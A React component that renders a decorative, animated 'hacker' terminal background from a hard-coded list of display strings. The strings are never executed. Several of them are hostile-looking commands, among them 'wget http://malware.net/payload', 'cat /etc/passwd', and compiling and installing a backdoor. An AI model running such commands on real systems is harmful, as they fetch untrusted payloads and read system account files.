import React, { useEffect, useRef, useState } from 'react';
import './TerminalBackground.css';

const TerminalBackground = ({
  opacity = 0.1,
  speed = 1,
  commands = []
}) => {
  const terminalRef = useRef(null);
  const [lines, setLines] = useState([]);

  const defaultCommands = [
    { command: 'nmap -sV -O 192.168.1.1', output: 'Starting Nmap 7.92 ( https://nmap.org )', delay: 2000 },
    { command: 'ssh root@cyberdeck.local', output: 'root@cyberdeck:~#', delay: 1500 },
    { command: 'cat /etc/passwd', output: 'root:x:0:0:root:/root:/bin/bash', delay: 1000 },
    { command: 'python exploit.py', output: '[+] Exploit successful! Access granted.', delay: 2500 },
    { command: 'wget http://malware.net/payload', output: 'Connecting to malware.net... Connected.', delay: 1800 },
    { command: 'gcc -o backdoor backdoor.c', output: 'Compilation successful. Binary created.', delay: 1200 },
    { command: './backdoor --install', output: '[+] Backdoor installed. System compromised.', delay: 2000 },
    { command: 'netstat -tuln', output: 'Active Internet connections (servers and established)', delay: 1500 },
    { command: 'ps aux | grep apache', output: 'apache2 processes running on ports 80, 443', delay: 1000 },
    { command: 'crontab -l', output: 'Scheduled tasks loaded. Persistence established.', delay: 1800 },
    { command: 'whoami', output: 'root', delay: 800 },
    { command: 'pwd', output: '/root/cyberdeck', delay: 600 },
    { command: 'ls -la', output: 'drwxr-xr-x 2 root root 4096 exploit.py backdoor.c payload.zip', delay: 1200 },
    { command: 'systemctl status firewall', output: '● firewall.service - Firewall disabled', delay: 1500 },
    { command: 'echo "Hacked by CyberNinja"', output: 'Message broadcasted to all terminals', delay: 1000 }
  ];

  const activeCommands = commands.length > 0 ? commands : defaultCommands;

  useEffect(() => {
    const terminal = terminalRef.current;
    if (!terminal) return;

    let currentCommandIndex = 0;
    let currentLineIndex = 0;
    const maxLines = 35; // Even more lines for full screen

    const addLine = () => {
      if (currentCommandIndex >= activeCommands.length) {
        currentCommandIndex = 0; // Loop back to start
      }

      const cmd = activeCommands[currentCommandIndex];
      const newLines = [];

      // Add command
      newLines.push({
        type: 'command',
        content: `$ ${cmd.command}`,
        timestamp: new Date().toLocaleTimeString()
      });

      // Add output after delay
      setTimeout(() => {
        setLines(prevLines => {
          const updatedLines = [...prevLines];
          updatedLines.push({
            type: 'output',
            content: cmd.output,
            timestamp: new Date().toLocaleTimeString()
          });

          // Keep only the last maxLines
          return updatedLines.slice(-maxLines);
        });
      }, 1000); // Even slower output delay for readability

      setLines(prevLines => {
        const updatedLines = [...prevLines, ...newLines];
        return updatedLines.slice(-maxLines);
      });

      currentCommandIndex++;
    };

    // Start the terminal animation - very slow for readability
    const interval = setInterval(addLine, 15000 / speed); // Much slower interval

    // Add initial lines
    for (let i = 0; i < 8; i++) {
      setTimeout(() => addLine(), i * 1000); // Slower initial population
    }

    return () => clearInterval(interval);
  }, [speed, activeCommands]);

  return (
    <div
      ref={terminalRef}
      className="terminal-background"
      style={{ opacity }}
    >
      <div className="terminal-window-bg">
        <div className="terminal-header-bg">
          <div className="terminal-title-bg">root@cyberdeck:~/hacking</div>
        </div>
        <div className="terminal-content-bg">
          {lines.map((line, index) => (
            <div key={index} className={`terminal-line-bg ${line.type}`}>
              <span className="terminal-timestamp">{line.timestamp}</span>
              <span className="terminal-text">{line.content}</span>
              {line.type === 'command' && <span className="cursor-blink">_</span>}
            </div>
          ))}
        </div>
      </div>
    </div>
  );
};

export default TerminalBackground;